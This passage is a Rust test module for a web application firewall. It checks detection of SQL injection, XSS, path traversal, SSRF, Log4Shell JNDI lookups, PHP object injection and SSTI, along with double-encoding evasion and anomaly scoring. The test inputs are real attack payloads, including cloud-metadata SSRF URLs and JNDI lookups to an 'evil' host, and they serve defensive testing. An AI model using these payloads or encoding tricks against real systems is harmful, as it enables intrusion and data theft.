		// A handful of benign requests that brush near the new rules must still pass.
		let waf = Waf::starter();
		for uri in ["/blog/data-structures-101", "/shop/cats-and-dogs", "/docs/php-vs-python", "/files/binary-data"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn single_encoded_xss_is_decoded_and_blocked() {
		// `<script>` hidden as %3Cscript%3E is caught after one decode pass.
		let waf = Waf::starter();
		let m = waf.inspect_str("%3Cscript%3Ealert(1)%3C/script%3E", "target").unwrap();
		assert_eq!(m.rule_id, "xss_script_tag");
	}

	#[test]
	fn single_encoded_traversal_is_decoded_and_blocked() {
		// `..%2f` decodes to `../`, matching the plaintext traversal rule.
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/files/..%2f..%2fetc/passwd"));
		assert_eq!(blocked(&v).category, WafCategory::PathTraversal);
	}

	#[test]
	fn double_encoded_input_is_blocked_as_anomaly() {
		// `%252e%252e%252f` -> `%2e%2e%2f` -> `../`: two passes, the evasion guard fires.
		let waf = Waf::starter();
		let m = waf.inspect_str("a%252e%252e%252fb", "target").unwrap();
		assert_eq!(m.rule_id, MULTI_ENCODING_RULE_ID);
		assert_eq!(m.category, WafCategory::ProtocolAnomaly);
	}

	#[test]
	fn multi_encoding_guard_can_be_relaxed_and_still_catches_payload() {
		// With the anomaly guard off, the fully-decoded payload still matches its rule.
		// `' OR 1=1` double-encoded: %2527%2520OR%25201%253D1 -> %27%20OR%201%3D1 -> ' OR 1=1
		let waf = Waf::starter().block_multi_encoded(false);
		let m = waf.inspect_str("%2527%2520OR%25201%253D1", "target").unwrap();
		assert_eq!(m.category, WafCategory::Sqli);
	}

	#[test]
	fn benign_encoded_input_still_passes() {
		// A legitimately percent-encoded space in a title is decoded but matches nothing.
		let waf = Waf::starter();
		assert_eq!(waf.inspect(&parts("GET", "/search?q=hello%20world")), Verdict::Allow);
	}

	#[test]
	fn malformed_percent_is_left_verbatim() {
		// A stray `%` and a truncated `%2` are not decodable; nothing should fire.
		let (decoded, changed) = percent_decode_once("100%25 done %2");
		assert!(changed); // the %25 -> %
		assert_eq!(decoded, "100% done %2");
		let (decoded2, changed2) = percent_decode_once("bare % and %zz");
		assert!(!changed2);
		assert_eq!(decoded2, "bare % and %zz");
	}

	#[test]
	fn body_inspection_is_off_by_default() {
		let waf = Waf::starter();
		assert_eq!(waf.body_cap(), None);
	}

	#[test]
	fn inspect_body_blocks_signature_payload() {
		let waf = Waf::starter().inspect_body_up_to(4096);
		assert_eq!(waf.body_cap(), Some(4096));
		let v = waf.inspect_body(b"comment=<script>steal()</script>");
		assert_eq!(blocked(&v).category, WafCategory::Xss);
		assert_eq!(blocked(&v).location, "body");
	}

	#[test]
	fn inspect_body_decodes_encoded_payload() {
		// A form-encoded SQLi body trips the rule after normalization, like any field.
		let waf = Waf::starter().inspect_body_up_to(4096);
		let v = waf.inspect_body(b"q=1%20UNION%20SELECT%20pw%20FROM%20users");
		assert_eq!(blocked(&v).category, WafCategory::Sqli);
	}

	#[test]
	fn inspect_body_allows_benign_payload() {
		let waf = Waf::starter().inspect_body_up_to(4096);
		assert_eq!(waf.inspect_body(b"name=Ada&message=hello there"), Verdict::Allow);
	}

	#[test]
	fn inspect_body_handles_binary_bytes() {
		// Non-UTF-8 bytes must not panic; the lossy decode still scans embedded ASCII.
		let waf = Waf::starter().inspect_body_up_to(4096);
		let mut body = vec![0xff, 0xfe, 0x00];
		body.extend_from_slice(b"<script>");
		assert_eq!(waf.inspect_body(&body), Verdict::Block(WafMatch { rule_id: "xss_script_tag", category: WafCategory::Xss, location: "body".to_owned(), score: None }));
	}

	#[test]
	fn normalize_counts_decode_passes() {
		assert_eq!(normalize("plain/path", false).decode_passes, 0);
		assert_eq!(normalize("%2e%2e", false).decode_passes, 1);
		assert_eq!(normalize("%252e", false).decode_passes, 2);
		// Decoding stops at the cap even if more layers remain.
		assert!(normalize("%25252525252e", false).decode_passes <= MAX_DECODE_PASSES);
	}

	#[test]
	fn plus_folds_to_space_only_when_requested() {
		// '+' is a literal in a path/header, a space in a query/form field.
		let n_path = normalize("a+b", false);
		assert_eq!(n_path.decoded, "a+b");
		assert_eq!(n_path.decode_passes, 0);
		let n_query = normalize("a+b", true);
		assert_eq!(n_query.decoded, "a b");
	}

	#[test]
	fn plus_encoded_sqli_in_query_is_caught() {
		// `a+OR+1=1` evades the whitespace-requiring tautology rule on the raw string but
		// trips it once '+' folds to a space in the query field.
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/login?user=a+OR+1=1"));
		let m = blocked(&v);
		assert_eq!(m.category, WafCategory::Sqli);
		assert_eq!(m.location, "query");
	}

	#[test]
	fn plus_in_path_is_not_treated_as_space() {
		// A literal '+' in a path segment must not be folded — no false "query" decoding.
		let waf = Waf::starter();
		assert_eq!(waf.inspect(&parts("GET", "/c++/reference")), Verdict::Allow);
	}

	#[test]
	fn scoring_mode_allows_single_weak_hit_below_threshold() {
		// One protocol-anomaly hit (weight 3) under a threshold of 8 is tolerated, where
		// first-match mode would have blocked it.
		let waf = Waf::starter().scoring_threshold(8);
		let mut p = parts("GET", "/");
		p.headers.insert("user-agent", "() { :; }; echo".parse().unwrap());
		assert_eq!(waf.inspect(&p), Verdict::Allow);
		// First-match mode (no threshold) still blocks the same request.
		assert!(matches!(Waf::starter().inspect(&p), Verdict::Block(_)));
	}

	#[test]
	fn scoring_mode_blocks_when_signals_combine() {
		// SQLi (5) in the query + XSS (4) in a header = 9 >= threshold 8 → blocked, and the
		// reported rule is the highest-weight (SQLi) signature.
		let waf = Waf::starter().scoring_threshold(8);
		let mut p = parts("GET", "/items?q=1%20OR%201=1");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		assert_eq!(blocked(&v).category, WafCategory::Sqli);
	}

	#[test]
	fn scoring_block_carries_aggregate_score() {
		// SQLi (5) in the query + XSS (4) in a header = 9. The block's representative match
		// reports that aggregate so a scored block is observable as such.
		let waf = Waf::starter().scoring_threshold(8);
		let mut p = parts("GET", "/items?q=1%20OR%201=1");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let v = waf.inspect(&p);
		assert_eq!(blocked(&v).score, Some(9));
	}

	#[test]
	fn first_match_block_has_no_score() {
		// First-match mode (no threshold) never attaches an aggregate score.
		let waf = Waf::starter();
		let v = waf.inspect(&parts("GET", "/items?q=1%20UNION%20SELECT%20pw"));
		assert_eq!(blocked(&v).score, None);
	}

	#[test]
	fn scoring_mode_multi_encoding_hard_block_has_no_score() {
		// The multiple-encoding guard is an independent hard block, not a score-driven one,
		// so it carries no aggregate score even in scoring mode.
		let waf = Waf::starter().scoring_threshold(1000);
		let v = waf.inspect(&parts("GET", "/x?p=a%252e%252e%252fb"));
		assert_eq!(blocked(&v).rule_id, MULTI_ENCODING_RULE_ID);
		assert_eq!(blocked(&v).score, None);
	}

	#[test]
	fn scoring_mode_blocks_single_hit_at_threshold() {
		// A lone SQLi (weight 5) meets a threshold of 5.
		let waf = Waf::starter().scoring_threshold(5);
		assert!(matches!(waf.inspect(&parts("GET", "/items?q=1%20UNION%20SELECT%20pw")), Verdict::Block(_)));
	}

	#[test]
	fn scoring_mode_still_hard_blocks_multi_encoding() {
		// The multiple-encoding guard fires regardless of how high the threshold is.
		let waf = Waf::starter().scoring_threshold(1000);
		let v = waf.inspect(&parts("GET", "/x?p=a%252e%252e%252fb"));
		assert_eq!(blocked(&v).rule_id, MULTI_ENCODING_RULE_ID);
	}

	#[test]
	fn scoring_mode_allows_clean_request() {
		let waf = Waf::starter().scoring_threshold(5);
		assert_eq!(waf.inspect(&parts("GET", "/articles/hello-world?page=2")), Verdict::Allow);
	}

	#[test]
	fn inspect_all_collects_every_signature() {
		let waf = Waf::starter();
		// SQLi in the query plus an XSS header — first-match `inspect` returns only one,
		// `inspect_all` returns both.
		let mut p = parts("GET", "/items?q=1%20UNION%20SELECT%20pw%20FROM%20users");
		p.headers.insert("referer", "<script>x</script>".parse().unwrap());
		let all = waf.inspect_all(&p);
		assert!(all.iter().any(|m| m.category == WafCategory::Sqli && m.location == "query"));
		assert!(all.iter().any(|m| m.rule_id == "xss_script_tag" && m.location == "header:referer"));
	}

	#[test]
	fn inspect_all_is_empty_for_benign_request() {
		let waf = Waf::starter();
		assert!(waf.inspect_all(&parts("GET", "/articles/hello-world?page=2")).is_empty());
		assert_eq!(anomaly_score(&[]), 0);
	}

	#[test]
	fn inspect_all_dedups_raw_and_decoded_in_one_field() {
		// `<script>` appears literally; its raw form already trips xss_script_tag and the
		// field's decoded form is identical here — the rule is reported once per field.
		let waf = Waf::starter();
		let all = waf.inspect_all(&parts("GET", "/x?c=%3Cscript%3E%3Cscript%3E"));
		let n = all.iter().filter(|m| m.rule_id == "xss_script_tag" && m.location == "query").count();
		assert_eq!(n, 1, "a rule fires at most once per field");
	}

	#[test]
	fn anomaly_score_sums_category_weights() {
		// SQLi (5) + XSS (4) = 9; threshold tuning is the operator's, not the engine's.
		let waf = Waf::starter();
		let mut p = parts("GET", "/items?q=1%20OR%201=1");
		p.headers.insert("user-agent", "<script>x</script>".parse().unwrap());
		let score = anomaly_score(&waf.inspect_all(&p));
		assert!(score >= 9, "expected combined SQLi+XSS score >= 9, got {score}");
	}

	#[test]
	fn inspect_all_respects_disabled_rules() {
		// A disabled rule contributes neither a match nor score on the collect-all path.
		let waf = Waf::starter().disable_category(WafCategory::Sqli);
		let all = waf.inspect_all(&parts("GET", "/items?q=1%20UNION%20SELECT%20pw"));
		assert!(all.iter().all(|m| m.category != WafCategory::Sqli));
	}

	#[test]
	fn category_weight_scale_is_ordered() {
		// Critical injection classes weigh at least as much as protocol oddities.
		assert!(WafCategory::Sqli.weight() >= WafCategory::Xss.weight());
		assert!(WafCategory::Xss.weight() >= WafCategory::ProtocolAnomaly.weight());
		assert_eq!(WafCategory::Ssrf.weight(), WafCategory::Sqli.weight());
	}

	#[test]
	fn ssrf_cloud_metadata_is_blocked() {
		let waf = Waf::starter();
		// The AWS/GCP/Azure link-local metadata endpoint, by IP and by path.
		assert_eq!(waf.inspect_str("url=http://169.254.169.254/latest/meta-data/iam", "target").unwrap().category, WafCategory::Ssrf);
		assert_eq!(waf.inspect_str("target=/computeMetadata/v1/project", "target").unwrap().rule_id, "ssrf_cloud_metadata_path");
	}

	#[test]
	fn ssrf_internal_scheme_and_loopback_are_blocked() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("u=gopher://internal:6379/_INFO", "query").unwrap().rule_id, "ssrf_internal_scheme");
		assert_eq!(waf.inspect_str("next=file:///etc/hostname", "query").unwrap().category, WafCategory::Ssrf);
		assert_eq!(waf.inspect_str("fetch=http://127.0.0.1:8080/admin", "query").unwrap().rule_id, "ssrf_loopback_url");
		assert_eq!(waf.inspect_str("fetch=https://localhost/internal", "query").unwrap().rule_id, "ssrf_loopback_url");
	}

	#[test]
	fn ssrf_category_metadata_is_stable() {
		assert_eq!(WafCategory::Ssrf.name(), "ssrf");
		assert_eq!(WafCategory::ALL[WafCategory::Ssrf.index()], WafCategory::Ssrf);
		// The index is still a bijection over the (now seven) categories.
		for cat in WafCategory::ALL {
			assert_eq!(WafCategory::ALL[cat.index()], cat);
		}
	}

	#[test]
	fn code_injection_rules_match() {
		let waf = Waf::starter();
		// Log4Shell and its nested-lookup obfuscation, a PHP unserialize gadget, and the
		// classic ${7*7} SSTI probe all attribute to the CodeInjection class.
		assert_eq!(waf.inspect_str("x=${jndi:ldap://evil/a}", "query").map(|m| m.category), Some(WafCategory::CodeInjection));
		assert_eq!(waf.inspect_str("x=${${lower:j}ndi:rmi://evil}", "query").unwrap().rule_id, "code_log4j_nested_lookup");
		assert_eq!(waf.inspect_str(r#"data=O:8:"Exploit":1:{s:3:"cmd"}"#, "query").unwrap().rule_id, "code_php_object_inject");
		assert_eq!(waf.inspect_str("tpl=${7*7}", "query").unwrap().rule_id, "code_ssti_arithmetic");
	}

	#[test]
	fn code_injection_rules_keep_false_positives_low() {
		// Benign requests mentioning braces/dollars or the word "code" must still pass.
		let waf = Waf::starter();
		for uri in ["/articles/json-${schema}-guide", "/pricing?total=7", "/docs/php-serialization-explained", "/blog/clean-code-tips"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn new_sqli_and_xss_rules_match() {
		let waf = Waf::starter();
		assert_eq!(waf.inspect_str("1 UNION SELECT pw INTO OUTFILE '/tmp/x'", "target").map(|m| m.category), Some(WafCategory::Sqli));
		assert_eq!(waf.inspect_str("href=vbscript:msgbox(1)", "target").unwrap().rule_id, "xss_vbscript_uri");
	}

	#[test]
	fn ssrf_rules_keep_false_positives_low() {
		// Benign requests that mention URLs/paths but are not SSRF must still pass.
		let waf = Waf::starter();
		for uri in ["/redirect?to=https://example.com/welcome", "/blog/file-formats-explained", "/docs/localhost-development-guide", "/articles/the-year-1692"] {
			assert_eq!(waf.inspect(&parts("GET", uri)), Verdict::Allow, "{uri} should not false-positive");
		}
	}

	#[test]
	fn disable_rule_silences_one_signature() {
		// Disabling the script-tag rule lets that payload through while the rest still fire.
		let waf = Waf::starter().disable_rule("xss_script_tag");
		assert!(!waf.is_rule_enabled("xss_script_tag"));
		assert_eq!(waf.enabled_rule_count(), waf.rule_count() - 1);
		assert_eq!(waf.inspect_str("<script>alert(1)</script>", "target"), None);
		// A different XSS rule (iframe) is untouched.
		assert_eq!(waf.inspect_str("<iframe src=//evil", "target").unwrap().rule_id, "xss_iframe_tag");
	}

	#[test]
	fn disable_rule_falls_through_to_next_matching_rule() {
		// With the earlier-indexed rule off, a string matching two rules reports the other.
		let waf = Waf::starter().disable_rule("xss_js_uri");
		let m = waf.inspect_str("javascript:void(0) onerror=1", "target").unwrap();
		assert_eq!(m.rule_id, "xss_event_handler");
	}

	#[test]
	fn disable_category_silences_a_whole_class() {
		let waf = Waf::starter().disable_category(WafCategory::Sqli);
		assert_eq!(waf.inspect_str("1 UNION SELECT pw FROM users", "target"), None);
		assert_eq!(waf.inspect_str("id=1 AND SLEEP(5)", "target"), None);
		// A non-SQLi attack is unaffected.
		assert_eq!(waf.inspect_str("<script>x</script>", "target").unwrap().category, WafCategory::Xss);
		// Every SQLi rule is now disabled.
		for r in starter_rules().into_iter().filter(|r| r.category == WafCategory::Sqli) {
			assert!(!waf.is_rule_enabled(r.id));
		}
	}

	#[test]
	fn disable_unknown_rule_is_a_noop() {
		let waf = Waf::starter().disable_rule("does_not_exist");
		assert_eq!(waf.enabled_rule_count(), waf.rule_count());
		assert!(!waf.is_rule_enabled("does_not_exist"));
	}

	#[test]
	fn disable_category_leaves_multi_encoding_guard_independent() {
		// Disabling ProtocolAnomaly rules must not turn off the multiple-encoding guard,
		// which is governed solely by block_multi_encoded.
		let waf = Waf::starter().disable_category(WafCategory::ProtocolAnomaly);
		let m = waf.inspect_str("a%252e%252e%252fb", "target").unwrap();
		assert_eq!(m.rule_id, MULTI_ENCODING_RULE_ID);
	}
}
